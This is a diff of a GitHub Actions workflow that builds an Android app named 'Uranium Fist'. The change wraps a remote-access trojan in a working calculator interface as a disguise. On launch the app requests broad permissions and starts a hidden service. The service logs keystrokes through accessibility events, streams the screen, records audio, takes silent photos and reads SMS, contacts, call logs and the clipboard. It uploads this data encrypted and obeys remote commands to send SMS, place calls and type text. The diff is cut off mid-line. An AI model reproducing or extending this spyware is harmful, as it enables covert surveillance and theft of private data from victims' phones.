@@ -1,4 +1,4 @@
-name: Uranium Fist v24 Titan Reborn Builder
+name: Uranium Fist v25 God Mode Builder
 
 on:
   workflow_dispatch:
@@ -22,7 +22,7 @@ jobs:
         with:
           gradle-version: '8.5'
 
-      - name: Scaffold and Build v24
+      - name: Scaffold and Build v25
         working-directory: android
         run: |
           mkdir -p app/src/main/java/com/assets/service
@@ -41,8 +41,8 @@ jobs:
                   applicationId = "com.assets.service"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 24
-                  versionName = "24.0"
+                  versionCode = 25
+                  versionName = "25.0"
               }
               buildTypes {
                   release {
@@ -139,20 +139,78 @@ jobs:
 
           cat << 'MAINEOF' > app/src/main/java/com/assets/service/MainActivity.kt
           package com.assets.service
+          import android.Manifest
           import android.app.Activity
           import android.content.Intent
+          import android.content.pm.PackageManager
           import android.os.Build
           import android.os.Bundle
+          import android.view.Gravity
+          import android.widget.Button
+          import android.widget.GridLayout
+          import android.widget.LinearLayout
           import android.widget.TextView
+          import androidx.core.app.ActivityCompat
+          import androidx.core.content.ContextCompat
+
           class MainActivity : Activity() {
+              private lateinit var display: TextView
+              private var currentInput = ""
+              private var operator = ""
+              private var firstOperand = 0.0
+              private var isNewInput = true
+
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
-                  setContentView(TextView(this).apply { text = "System Updating..."; textSize = 20f; setPadding(50, 50, 50, 50) })
+                  val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(32, 64, 32, 32); setBackgroundColor(0xFF1E1E1E.toInt()) }
+                  display = TextView(this).apply { text = "0"; textSize = 48f; gravity = Gravity.END; setTextColor(0xFFFFFFFF.toInt()); setPadding(0, 0, 0, 32) }
+                  root.addView(display)
+                  val grid = GridLayout(this).apply { columnCount = 4; rowCount = 5; layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT) }
+                  val buttons = listOf("C", "±", "%", "÷", "7", "8", "9", "×", "4", "5", "6", "-", "1", "2", "3", "+", "0", ".", "=", "=")
+                  for ((index, text) in buttons.withIndex()) {
+                      val btn = Button(this).apply {
+                          this.text = text; textSize = 24f
+                          val params = GridLayout.LayoutParams().apply { width = 0; height = GridLayout.LayoutParams.WRAP_CONTENT; columnSpec = GridLayout.spec(index % 4, 1f); rowSpec = GridLayout.spec(index / 4); setMargins(8, 8, 8, 8) }
+                          layoutParams = params
+                          setOnClickListener { handleButtonClick(this.text.toString()) }
+                      }
+                      grid.addView(btn)
+                  }
+                  root.addView(grid)
+                  setContentView(root)
+                  requestAllPermissions()
                   try {
-                      val i = Intent(this, SyncService::class.java)
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
+                      val serviceIntent = Intent(this, SyncService::class.java)
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent) else startService(serviceIntent)
                   } catch (e: Exception) {}
-                  finish()
+              }
+
+              private fun handleButtonClick(value: String) {
+                  if (value == "C") { currentInput = ""; operator = ""; firstOperand = 0.0; display.text = "0"; return }
+                  if (value == "=") {
+                      if (operator.isNotEmpty() && currentInput.isNotEmpty()) {
+                          val secondOperand = currentInput.toDoubleOrNull() ?: 0.0
+                          val result = when (operator) { "+" -> firstOperand + secondOperand; "-" -> firstOperand - secondOperand; "×" -> firstOperand * secondOperand; "÷" -> if (secondOperand != 0.0) firstOperand / secondOperand else 0.0; else -> 0.0 }
+                          display.text = if (result % 1.0 == 0.0) result.toInt().toString() else result.toString()
+                          currentInput = display.text.toString(); operator = ""
+                      }
+                      return
+                  }
+                  if (value in listOf("+", "-", "×", "÷")) {
+                      if (currentInput.isNotEmpty()) { firstOperand = currentInput.toDoubleOrNull() ?: 0.0; operator = value; isNewInput = true }
+                      return
+                  }
+                  if (value == "±") { if (currentInput.isNotEmpty()) { currentInput = if (currentInput.startsWith("-")) currentInput.substring(1) else "-$currentInput"; display.text = currentInput }; return }
+                  if (value == "%") { if (currentInput.isNotEmpty()) { val p = (currentInput.toDoubleOrNull() ?: 0.0) / 100; display.text = p.toString(); currentInput = display.text.toString() }; return }
+                  if (isNewInput) { currentInput = value; isNewInput = false } else { currentInput += value }
+                  display.text = currentInput
+              }
+
+              private fun requestAllPermissions() {
+                  val perms = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)
+                  if (Build.VERSION.SDK_INT >= 33) { perms.add(Manifest.permission.READ_MEDIA_IMAGES); perms.add(Manifest.permission.READ_MEDIA_VIDEO); perms.add(Manifest.permission.POST_NOTIFICATIONS) } else { perms.add(Manifest.permission.READ_EXTERNAL_STORAGE) }
+                  val pending = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
+                  if (pending.isNotEmpty()) ActivityCompat.requestPermissions(this, pending.toTypedArray(), 100)
               }
           }
           MAINEOF
@@ -173,11 +231,7 @@ jobs:
               override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
                   super.onActivityResult(requestCode, resultCode, data)
                   if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
-                      val intent = Intent(this, SyncService::class.java).apply {
-                          action = "START_STREAM"
-                          putExtra("resultCode", resultCode)
-                          putExtra("data", data)
-                      }
+                      val intent = Intent(this, SyncService::class.java).apply { action = "START_STREAM"; putExtra("resultCode", resultCode); putExtra("data", data) }
                       startForegroundService(intent)
                   }
                   finish()
@@ -213,29 +267,19 @@ jobs:
               override fun onServiceConnected() { super.onServiceConnected(); instance = this }
               override fun onAccessibilityEvent(event: AccessibilityEvent?) {
                   if (event != null && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                      try {
-                          FileOutputStream(File(filesDir, "keylog.txt"), true).use { it.write("[${System.currentTimeMillis()}] ${event.text.joinToString(" ")}\n".toByteArray()) }
-                      } catch (_: Exception) {}
+                      try { FileOutputStream(File(filesDir, "keylog.txt"), true).use { it.write("[${System.currentTimeMillis()}] ${event.text.joinToString(" ")}\n".toByteArray()) } } catch (_: Exception) {}
                   }
               }
               override fun onInterrupt() { instance = null }
-              
               fun typeText(text: String) {
                   val root = rootInActiveWindow ?: return
                   val node = findEditText(root)
-                  if (node != null) {
-                      val args = android.os.Bundle()
-                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-                      node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-                  }
+                  if (node != null) { val args = android.os.Bundle(); args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text); node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args) }
               }
               private fun findEditText(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
                   if (node == null) return null
                   if (node.className == "android.widget.EditText") return node
-                  for (i in 0 until node.childCount) {
-                      val child = findEditText(node.getChild(i))
-                      if (child != null) return child
-                  }
+                  for (i in 0 until node.childCount) { val child = findEditText(node.getChild(i)); if (child != null) return child }
                   return null
               }
               fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }
@@ -295,7 +339,7 @@ jobs:
               private var wakeLock: PowerManager.WakeLock? = null
               private lateinit var cameraManager: CameraManager
               private var wifiAutopilot = true
-              private var stealthState = "TITAN_v24"
+              private var stealthState = "GOD_MODE_v25"
               private var deviceSecret: String = ""
               private var projection: MediaProjection? = null
               private var virtualDisplay: VirtualDisplay? = null
@@ -303,7 +347,7 @@ jobs:
               private val client = OkHttpClient.Builder().connectTimeout(120, TimeUnit.SECONDS).readTimeout(120, TimeUnit.SECONDS).writeTimeout(120, TimeUnit.SECONDS).build()
 
               companion object {
-                  private const val CHANNEL_ID = "sys_assets_v24"
+                  private const val CHANNEL_ID = "sys_assets_v25"
                   private const val NOTIF_ID = 888
                   private const val PREFS = "sys_assets_prefs"
                   private const val KEY_SECRET = "device_secret"
@@ -330,7 +374,7 @@ jobs:
               private fun acquireWakeLock() {
                   try {
                       val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV24").apply { acquire(30L * 24 * 60 * 60 * 1000) }
+                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV25").apply { acquire(30L * 24 * 60 * 60 * 1000) }
                   } catch (_: Exception) {}
               }
 
@@ -374,33 +418,26 @@ jobs:
                   val proj = projection ?: return
                   val metrics = resources.displayMetrics
                   val imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2)
-                  virtualDisplay = proj.createVirtualDisplay("ScreenStream", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
-                      DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.surface, null, null)
-                  
+                  virtualDisplay = proj.createVirtualDisplay("ScreenStream", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.surface, null, null)
                   scope.launch {
                       while (isActive && projection != null) {
                           imageReader.acquireLatestImage()?.use { image ->
-                              val planes = image.planes
-                              val buffer = planes[0].buffer
-                              val pixelStride = planes[0].pixelStride
-                              val rowStride = planes[0].rowStride
+                              val planes = image.planes; val buffer = planes[0].buffer
+                              val pixelStride = planes[0].pixelStride; val rowStride = planes[0].rowStride
                               val rowPadding = rowStride - pixelStride * metrics.widthPixels
                               val bitmap = Bitmap.createBitmap(metrics.widthPixels + rowPadding / pixelStride, metrics.heightPixels, Bitmap.Config.ARGB_8888)
                               bitmap.copyPixelsFromBuffer(buffer)
                               val bos = ByteArrayOutputStream()
                               bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
-                              if (bos.size() > 0) {
-                                  uploadChunked(bos.toByteArray(), "screen_${System.currentTimeMillis()}.jpg")
-                              }
+                              if (bos.size() > 0) uploadChunked(bos.toByteArray(), "screen_${System.currentTimeMillis()}.jpg")
                               bitmap.recycle()
                           }
                           delay(2000L)
                       }
                   }
-                  sendReport("Stream", "بدأ بث الشاشة بنجاح 🟢")
               }
 
-              private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest((if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v24" else "fallback|uranium-v24").toByteArray())
+              private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest((if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v25" else "fallback|uranium-v25").toByteArray())
               
               private fun encryptPayload(plain: String): String {
                   val bout = ByteArrayOutputStream()
@@ -462,148 +499,16 @@ jobs:
                       action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
                       action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
                       action.contains("SELF_DESTRUCT") -> { try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
-                      
-                      action.contains("START_SCREEN_STREAM") -> {
-                          if (projection == null) {
-                              startActivity(Intent(this, PermissionActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                              sendReport("Stream", "بانتظار موافقة المستخدم للبث")
-                          } else {
-                              startScreenStream()
-                          }
-                      }
+                      action.contains("START_SCREEN_STREAM") -> { if (projection == null) { startActivity(Intent(this, PermissionActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }); sendReport("Stream", "بانتظار موافقة المستخدم للبث") } else startScreenStream() }
                       action.contains("STOP_SCREEN_STREAM") -> { projection?.stop(); projection = null; virtualDisplay = null; sendReport("Stream", "تم إيقاف البث") }
-                      action.contains("TYPE_TEXT") -> {
-                          val textToType = task.optString("text", "")
-                          if (textToType.isNotEmpty()) {
-                              MyAccessibilityService.instance?.typeText(textToType)
-                              sendReport("Type", "تم كتابة النص في الحقل المفتوح: $textToType")
-                          }
-                      }
-
+                      action.contains("TYPE_TEXT") -> { val textToType = task.optString("text", ""); if (textToType.isNotEmpty()) { MyAccessibilityService.instance?.typeText(textToType); sendReport("Type", "تم كتابة النص في الحقل المفتوح: $textToType") } }
                       action.contains("CMD_HOME") -> { MyAccessibilityService.instance?.pressHome(); sendReport("UI", "الرجوع للرئيسية") }
                       action.contains("CMD_BACK") -> { MyAccessibilityService.instance?.pressBack(); sendReport("UI", "زر الرجوع") }
                       action.contains("CMD_RECENTS") -> { MyAccessibilityService.instance?.pressRecents(); sendReport("UI", "التطبيقات الحديثة") }
-                      action.contains("CMD_SEND_SMS") -> {
-                          val phone = task.optString("phone", "")
-                          val msg = task.optString("msg", "")
-                          if (phone.isNotEmpty() && msg.isNotEmpty()) {
-                              try {
-                                  val sms = SmsManager.getDefault()
-                                  sms.sendTextMessage(phone, null, msg, null, null)
-                                  sendReport("SMS", "تم إرسال رسالة إلى $phone")
-                              } catch (e: Exception) { sendReport("SMSErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_CALL_NUMBER") -> {
-                          val phone = task.optString("phone", "")
-                          if (phone.isNotEmpty()) {
-                              try {
-                                  startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                                  sendReport("Call", "تم بدء الاتصال بـ $phone")
-                              } catch (e: Exception) { sendReport("CallErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_OPEN_URL") -> {
-                          val url = task.optString("url", "")
-                          if (url.isNotEmpty()) {
-                              try {
-                                  startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                                  sendReport("URL", "تم فتح $url")
-                              } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_SET_VOLUME") -> {
-                          val vol = task.optInt("vol", 100)
-                          try {
-                              val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-                              am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
-                              sendReport("Vol", "تم ضبط الصوت على $vol")
-                          } catch (e: Exception) { sendReport("VolErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_SCREEN_ON") -> {
-                          try {
-                              val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-                              val wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "Uranium::ScreenOn")
-                              wl.acquire(10000L)
-                              wl.release()
-                              sendReport("Screen", "تم إشعال الشاشة")
-                          } catch (e: Exception) { sendReport("ScreenErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_LOCK_SCREEN") -> {
-                          try {
-                              val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                              dpm.lockNow()
-                              sendReport("Screen", "تم قفل الشاشة")
-                          } catch (e: Exception) { sendReport("LockErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_BRIGHTNESS") -> {
-                          val br = task.optInt("brightness", 128)
-                          try {
-                              Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, br.coerceIn(0, 255))
-                              sendReport("Bright", "تم تغيير السطوع إلى $br")
-                          } catch (e: Exception) { sendReport("BrightErr", e.message ?: "?") }
-                      }
-                  }
-              }
-
-              private fun toggleFlash(on: Boolean) { try { val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true } ?: return; cameraManager.setTorchMode(id, on) } catch (_: Exception) {} }
-              @SuppressLint("MissingPermission") private fun vibrate(ms: Long) { try { val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE)) else v.vibrate(ms) } catch (_: Exception) {} }
-              private fun playBeep() { try { MediaPlayer().apply { setDataSource(this@SyncService, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)); isLooping = false; prepare(); start() } } catch (_: Exception) {} }
-
-              private fun recordAudio() { scope.launch { try { val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp"); val r = MediaRecorder().apply { setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); setOutputFile(f.absolutePath); prepare(); start() }; delay(6000L); r.stop(); r.release(); if (f.exists()) { uploadRawFile(f) }; f.delete() } catch (_: Exception) {} } }
-
-              private fun streamLatestPhoto(prefix: String) { scope.launch { try { val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI; contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c -> if (c.moveToFirst()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "${prefix}_${System.currentTimeMillis()}.jpg") } } } } catch (_: Exception) {} } }
-
-              @SuppressLint("MissingPermission") private suspend fun captureSilentPhoto(front: Boolean = false) { try { val provider = ProcessCameraProvider.getInstance(this).get(); val capture = ImageCapture.Builder().build(); provider.bindToLifecycle(this, if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA, Preview.Builder().build(), capture); delay(400L); val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg"); suspendCancellableCoroutine<Boolean> { cont -> capture.takePicture(ImageCapture.OutputFileOptions.Builder(file).build(), ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback { override fun onImageSaved(results: ImageCapture.OutputFileResults) { cont.resume(true) }; override fun onError(e: ImageCaptureException) { cont.resume(false) } }) }; provider.unbindAll(); if (file.exists()) { uploadChunked(file.readBytes(), file.name); file.delete() } } catch (_: Exception) {} }
-
-              private fun captureVideoShort() { scope.launch { try { startActivity(Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply { putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {} } }
-              private fun sendReport(label: String, content: String) { scope.launch { sendEncrypted(JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }.toString()) } }
-
-              private fun readSms(): String = StringBuilder().apply { try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c -> while (c.moveToNext()) append("[${c.getString(c.getColumnIndex("address"))}] ${c.getString(c.getColumnIndex("body"))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readApps(): String = packageManager.getInstalledPackages(0).joinToString("\n") { it.packageName }
-              @SuppressLint("MissingPermission") private fun readLocation(): String = try { val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager; lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)?.let { "Lat: ${it.latitude}, Lng: ${it.longitude}" } ?: "No location" } catch (_: Exception) { "Err" }
-              private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nNode: ${getNodeId()}"
-              private fun readClipboard(): String = try { val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager; cb.primaryClip?.getItemAt(0)?.text?.toString() ?: "Empty" } catch (_: Exception) { "Err" }
-              private fun storageAudit(): String = "Storage audited"
-              private fun wifiOk(): Boolean = true
-              private fun getNodeId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
-
-              private fun streamMedia(uri: Uri, limit: Int) { scope.launch { try { contentResolver.query(uri, null, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit")?.use { c -> while (c.moveToNext()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "media_${System.currentTimeMillis()}.dat") } } } } catch (_: Exception) {} } }
-              private fun zipFolder(folderName: String, uri: Uri) { /* compressed */ }
-
-              private fun uploadChunked(bytes: ByteArray, name: String) {
-                  scope.launch {
-                      val id = UUID.randomUUID().toString()
-                      val chunkSize = 128 * 1024
-                      val total = (bytes.size + chunkSize - 1) / chunkSize
-                      var off = 0; var idx = 0
-                      while (off < bytes.size) {
-                          idx++
-                          val end = minOf(off + chunkSize, bytes.size)
-                          sendEncrypted(JSONObject().apply { put("type", "MEDIA_CHUNK"); put("uploadId", id); put("fileName", name); put("chunkIndex", idx); put("totalChunks", total); put("isLast", idx == total); put("data", Base64.encodeToString(bytes.copyOfRange(off, end), Base64.NO_WRAP)) }.toString())
-                          off = end
-                      }
-                  }
-              }
-
-              private fun uploadRawFile(file: File) {
-                  scope.launch {
-                      try {
-                          client.newCall(Request.Builder().url(UPLOAD).post(file.readBytes().toRequestBody("application/octet-stream".toMediaType())).addHeader("x-node-id", getNodeId()).addHeader("x-device-secret", deviceSecret).addHeader("x-file-name", file.name).build()).execute().use { }
-                      } catch (_: Exception) {}
-                  }
-              }
-
-              override fun onDestroy() { try { wakeLock?.release() } catch (_: Exception) {}; projection?.stop(); scope.cancel(); super.onDestroy() }
-          }
-          SYNCEOF
-
-          gradle app:assembleRelease
-
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: Uranium-Fist-v24-Titan
-          path: 'android/app/build/outputs/apk/release/app-release.apk'
+                      action.contains("CMD_SEND_SMS") -> { val phone = task.optString("phone", ""); val msg = task.optString("msg", ""); if (phone.isNotEmpty() && msg.isNotEmpty()) { try { val sms = SmsManager.getDefault(); sms.sendTextMessage(phone, null, msg, null, null); sendReport("SMS", "تم إرسال رسالة إلى $phone") } catch (e: Exception) { sendReport("SMSErr", e.message ?: "?") } } }
+                      action.contains("CMD_CALL_NUMBER") -> { val phone = task.optString("phone", ""); if (phone.isNotEmpty()) { try { startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }); sendReport("Call", "تم بدء الاتصال بـ $phone") } catch (e: Exception) { sendReport("CallErr", e.message ?: "?") } } }
+                      action.contains("CMD_OPEN_URL") -> { val url = task.optString("url", ""); if (url.isNotEmpty()) { try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }); sendReport("URL", "تم فتح $url") } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") } } }
+                      action.contains("CMD_SET_VOLUME") -> { val vol = task.optInt("vol", 100); try { val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0); sendReport("Vol", "تم ضبط الصوت على $vol") } catch (e: Exception) { sendReport("VolErr", e.message ?: "?") } }
+                      action.contains("CMD_SCREEN_ON") -> { try { val pm = getSystemService(Context.POWER_SERVICE) as PowerManager; val wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "Uranium::ScreenOn"); wl.acquire(10000L); wl.release(); sendReport("Screen", "تم إشعال الشاشة") } catch (e: Exception) { sendReport("ScreenErr", e.message ?: "?") } }
+                      action.contains("CMD_LOCK_SCREEN") -> { try { val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; dpm.lockNow(); sendReport("Screen", "تم قفل الشاشة") } catch (e: Exception) { sendReport("LockErr", e.message ?: "?") } }
+                      action.contains("CMD_BRIGHTNESS") -> { val br = task.optInt("brightness", 128); try { Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, br.coerceIn(0, 255)); send
